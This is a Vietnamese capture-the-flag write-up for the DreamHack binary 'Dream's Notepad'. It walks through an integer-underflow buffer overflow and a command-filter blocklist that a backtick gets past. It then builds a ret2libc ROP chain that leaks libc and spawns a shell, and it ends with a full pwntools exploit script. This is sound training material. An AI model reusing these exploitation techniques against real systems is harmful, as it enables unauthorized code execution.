# Dream-s-Notepad---Write-up-----DreamHack
Hướng dẫn cách giải bài Dream's Notepad cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 7/12/2025

## 1. Mục tiêu cần làm
1. Kích hoạt lỗi Integer Underflow để gây Buffer Overflow
2. Bypass bộ lọc của chương trình
3. Leak địa chỉ Libc và dùng đúng Libc ẩn
4. Nắc em CPU để chiếm quyền điều khiển

## 2. Cách thực thi
Đầu tiên hãy kiểm tra xem bài này có các lớp bảo mật nào.

<img width="372" height="142" alt="image" src="https://github.com/user-attachments/assets/455a0d4f-2e75-4739-9cc3-7c4a8416462f" />

Không có Canary, không PIE và không NX vậy là khá dễ. Giờ hãy bắt đầu đọc code bài này thôi.

```C
FILE* p = fopen("/home/Dnote/note", "r");
    unsigned int size = 0; // [1] Khởi tạo size bằng 0
    
    if (p > 0) {
        // Nếu mở file thành công thì cập nhật size
        fseek(p, 0, SEEK_END);
        size = ftell(p) + 1; 
        fclose(p);
        remove("/home/Dnote/note");
    }

    char message[256];
    
    // [2] Lỗi nằm ở đây!!!
    read(0, message, size - 1);
```

Như các bạn thấy thì nó sẽ đọc vào số byte bằng `size - 1`, nhưng sẽ ra sao nếu `size` = 0 ? Nó sẽ đọc -1 nhưng vì chương trình không có vụ đọc -1 byte nên nó sẽ biến thành số dương cực kì lớn từ đó gây lỗi Buffer Overflow. Vậy làm sao để biến `size` này bằng 0 ?

Như các bạn đọc thì thấy nó sẽ lấy số byte mà file `note` đang có. Và `note` này được nhận từ đâu ? Đó chính là lệnh này

```C
sprintf(tmp, "echo %s > /home/Dnote/note", content);
    system(tmp);
```

Nghĩa là ví dụ bạn nhập vào `content` là chữ Hello thì chương trình sẽ thực thi lệnh `echo Hello > /home/Dnote/note`. Nghĩa là nó sẽ ghi Hello vào file note, và Hello có 5 byte thì `size` sẽ là 5. Vậy làm sao để biến nội dung nhập vào là 0 ?

Chúng ta có rất nhiều lệnh nhưng nhìn vào bộ lọc của đề

```C
if(strstr(content, ".") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "/") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, ";") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "*") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "cat") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "echo") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "flag") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "sh") != NULL) {
        puts("It can't be..");
        return;
    }
    else if(strstr(content, "bin") != NULL) {
        puts("It can't be..");
        return;
    }
``` 

Nó lọc gần như hết các dấu + câu lệnh, nhưng nó quên lọc 1 dấu là dấu huyền ( mình không thể gõ ra được nên mình sẽ ghi vô code ). Khi ta `echo dấu huyền > /home/Dnote/note` thì nó sẽ lỗi không chạy và nó sẽ không nhập bất kì byte nào vào file này. Từ đó `size` sẽ là 0 byte và gây ra lỗi Buffer Overflow.

Vậy là xong bước 1 và 2, giờ sang bước 3 là leak Libc. Cách thực thi cũng khá dễ, vì chương trình đã gọi lệnh `read` trước đó và thực thi luôn lệnh `puts` nên ta có thể áp dụng điều này để chạy ROPchain và in ra `read@got` từ đó tính được `Libc base`.

```Python
padding = b'a' * 488

payload_leak = padding
payload_leak += p64(pop_rdi)
payload_leak += p64(got_read)
payload_leak += p64(plt_puts)
payload_leak += p64(addr_main) # quay lại main sau khi đã có got_read
```

Nhiều bạn sẽ thắc mắc là tại sao padding tận 488 vậy thì để mình nói luôn. Theo như trên stack thì không chỉ có mỗi `message` mà còn nhiều như `content`, `tmp`,... Sau khi cộng hết lại là ra 470 nhưng theo quy tắc **Stack Alignment** (16-byte) của hệ điều hành 64-bit, Compiler sẽ cấp phát 480 bytes (0x1E0) cho stack frame tính từ RBP. Và 480 + 8 byte của saved RBP thì cần 488 để đè tới saved RIP.

Sau khi in ra địa chỉ của `got_read` thì chúng ta sẽ tính `Libc base`. Nhưng mà mình chỉ mới chỉ các bạn tìm ra địa chỉ thôi còn offset của `read_got` thì mình chưa chỉ, vì không có file `libc` nên chúng ta sẽ nhờ đến trang web `libc.rip` để đò offset. Khi vô các bạn hãy nhập `read` và 3 số đuôi cuối của địa chỉ read.

<img width="661" height="85" alt="image" src="https://github.com/user-attachments/assets/0ad99500-b068-4253-b98c-84688405c7aa" />

Sau khi search thì nó sẽ cho các bạn chọn thư viện `libc`, giờ thì chúng ta nên chọn cái nào đây ?

Các bạn hãy gõ lệnh `strings ./Notepad | grep 'ubuntu` và nó sẽ hiện ra phiên bản ubuntu của bài này.

<img width="633" height="36" alt="image" src="https://github.com/user-attachments/assets/09dd50db-84cb-4e1f-8ef7-524372689dfd" />

Dòng này cho ta biết 2 điều cực kỳ quan trọng:
1. Hệ điều hành: Chương trình được biên dịch trên Ubuntu 16.04.
2. Phiên bản mặc định: Ubuntu 16.04 mặc định sử dụng Glibc 2.23.

Vậy chúng ta chỉ chọn thư viện `libc` nào có tên là `libc6_2.23` và trùng hợp chỉ có đúng 1 thư viện là `libc6_2.23-0ubuntu11.3_amd64`. Bấm vào và ta sẽ ra được như vậy

<img width="453" height="121" alt="image" src="https://github.com/user-attachments/assets/1ec29eed-8596-41be-bd63-955be293e7b9" />

Đây là offset của nó và công thức tính địa chỉ của tụi này là ` Địa chỉ = Lib_base + offset `. Vậy giờ hãy tìm địa chỉ của `system` và `str_bin_sh` thôi.

```Python
libc_offsets = {
    'read':        0xf7350,   
    'system':      0x453a0,
    'str_bin_sh':  0x18ce57
}

system_addr = libc_base + libc_offsets['system']
bin_sh_addr = libc_base + libc_offsets['str_bin_sh']
```

Giờ chúng ta đã có đủ hết rồi hãy bắt đầu tạo 1 ROPchain và băm chương trình này thôi.

```Python
payload_shell = padding
payload_shell += p64(pop_rdi)
payload_shell += p64(bin_sh_addr)
payload_shell += p64(system_addr)
```

Thế là xong, chúng ta đã chiếm được quyền điều khiển. Bài này khá dễ với mình ( sau vài tiếng debug 🐧 ), bài này giúp các bạn hiểu thêm về các lệnh linux và nâng trình **Leak libc** + **ROPchain** thôi. Hãy cho mình 1 star để có động lực viết tiếp nha 🐧.


```Python
from pwn import *


libc_offsets = {
    'read':        0xf7350,   
    'system':      0x453a0,
    'str_bin_sh':  0x18ce57
}


HOST = 'host8.dreamhack.games'
PORT = 10185  

p = remote(HOST, PORT)
e = ELF('./Notepad')


log.info("--- STAGE 1: LEAK ---")


p.sendlineafter(b"-----Enter the content-----", b"`")


pop_rdi = 0x400c73 
got_read = e.got['read']
plt_puts = e.plt['puts']
addr_main = e.symbols['main']


padding = b'a' * 488


payload_leak = padding
payload_leak += p64(pop_rdi)
payload_leak += p64(got_read)
payload_leak += p64(plt_puts)
payload_leak += p64(addr_main)

p.sendafter(b"-----Leave a message-----\n", payload_leak)


p.recvuntil(b"Bye Bye!!:-)\n")

try:
    leak_raw = p.recv(6).ljust(8, b'\x00')
    leak_addr = u64(leak_raw)
    log.success(f'Leaked read address: {hex(leak_addr)}')
except EOFError:
    log.error("Lỗi EOF. Thử restart server.")
    exit()



libc_base = leak_addr - libc_offsets['read']
log.success(f'Libc Base: {hex(libc_base)}')


system_addr = libc_base + libc_offsets['system']
bin_sh_addr = libc_base + libc_offsets['str_bin_sh']

log.info(f'System Addr: {hex(system_addr)}')


log.info("--- STAGE 3: PWN ---")

p.sendlineafter(b"-----Enter the content-----", b"`")


payload_shell = padding
payload_shell += p64(pop_rdi)
payload_shell += p64(bin_sh_addr)
payload_shell += p64(system_addr)

p.sendafter(b"-----Leave a message-----\n", payload_shell)

p.interactive()
```
